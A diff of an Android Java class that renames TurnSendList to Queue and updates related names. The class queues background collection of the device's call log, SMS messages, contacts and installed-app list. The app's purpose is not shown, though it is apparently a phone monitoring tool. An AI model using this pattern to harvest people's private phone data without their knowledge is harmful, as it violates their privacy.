@@ -1,22 +1,22 @@
 package com.inet.android.list;
 
-import com.inet.android.request.ConstantValue;
-import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
-
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.preference.PreferenceManager;
 
+import com.inet.android.request.AppConstants;
+import com.inet.android.utils.AppSettings;
+import com.inet.android.utils.Logging;
+
 /**
- * TurnSendList class is designed to call control functions of single classes
+ * Queue class is designed to call control functions of single classes
  * 
  * @author johny homicide
  * 
  */
-public class TurnSendList {
-	private static final String LOG_TAG = TurnSendList.class.getSimpleName()
+public class Queue {
+	private static final String LOG_TAG = Queue.class.getSimpleName()
 			.toString();
 	String list;
 	Context mContext;
@@ -25,7 +25,7 @@ public class TurnSendList {
 	String value;
 	String busy;
 
-	public TurnSendList(Context mContext) {
+	public Queue(Context mContext) {
 		this.mContext = mContext;
 
 	}
@@ -40,16 +40,16 @@ public class TurnSendList {
 		if (busy != null)
 			ed.putString("busy", busy);
 		switch (list) {
-		case ConstantValue.TYPE_LIST_CALL:
+		case AppConstants.TYPE_LIST_CALL:
 			ed.putInt("list_call", value);
 			break;
-		case ConstantValue.TYPE_LIST_SMS:
+		case AppConstants.TYPE_LIST_SMS:
 			ed.putInt("list_sms", value);
 			break;
-		case ConstantValue.TYPE_LIST_CONTACTS:
+		case AppConstants.TYPE_LIST_CONTACTS:
 			ed.putInt("list_contact", value);
 			break;
-		case ConstantValue.TYPE_LIST_APP:
+		case AppConstants.TYPE_LIST_APP:
 			ed.putInt("list_app", value);
 			break;
 		default:
@@ -57,10 +57,10 @@ public class TurnSendList {
 		}
 		Logging.doLog(LOG_TAG, "list = " + value, "list = " + value);
 		ed.commit();
-		startGetList(mContext);
+		getList(mContext);
 	}
 
-	public static void startGetList(Context mContext) {
+	public static void getList(Context mContext) {
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(mContext);
 		Editor ed = sp.edit();
@@ -70,35 +70,35 @@ public class TurnSendList {
 			Logging.doLog(LOG_TAG,
 					"StartGetList busy = " + sp.getString("busy", "0"),
 					"busy = " + sp.getString("busy", "0"));
-			if (ValueWork.getMethod(ConstantValue.TYPE_LIST_CALL, mContext) != 0) {
+			if (AppSettings.getSetting(AppConstants.TYPE_LIST_CALL, mContext) != 0) {
 				Logging.doLog(LOG_TAG, "list_call go", "list_call go");
 				ed.putString("busy", "1");
 				ed.commit();
-				ListCall arhCall = new ListCall();
+				CallList arhCall = new CallList();
 				arhCall.execute(mContext);
 				return;
-			} else if (ValueWork.getMethod(ConstantValue.TYPE_LIST_SMS,
+			} else if (AppSettings.getSetting(AppConstants.TYPE_LIST_SMS,
 					mContext) != 0) {
 				Logging.doLog(LOG_TAG, "list_sms go", "list_sms go");
 				ed.putString("busy", "1");
 				ed.commit();
-				ListSms arhSms = new ListSms();
+				MessageList arhSms = new MessageList();
 				arhSms.execute(mContext);
 				return;
-			} else if (ValueWork.getMethod(ConstantValue.TYPE_LIST_CONTACTS,
+			} else if (AppSettings.getSetting(AppConstants.TYPE_LIST_CONTACTS,
 					mContext) != 0) {
 				Logging.doLog(LOG_TAG, "list_contact go", "list_contact go");
 				ed.putString("busy", "1");
 				ed.commit();
-				ListContacts getCont = new ListContacts();
+				ContactsList getCont = new ContactsList();
 				getCont.execute(mContext);
 				return;
-			} else if (ValueWork.getMethod(ConstantValue.TYPE_LIST_APP,
+			} else if (AppSettings.getSetting(AppConstants.TYPE_LIST_APP,
 					mContext) != 0) {
 				Logging.doLog(LOG_TAG, "list_app go", "list_app go");
 				ed.putString("busy", "1");
 				ed.commit();
-				ListApp listApp = new ListApp();
+				AppList listApp = new AppList();
 				listApp.getListOfInstalledApp(mContext);
 				return;
 			}
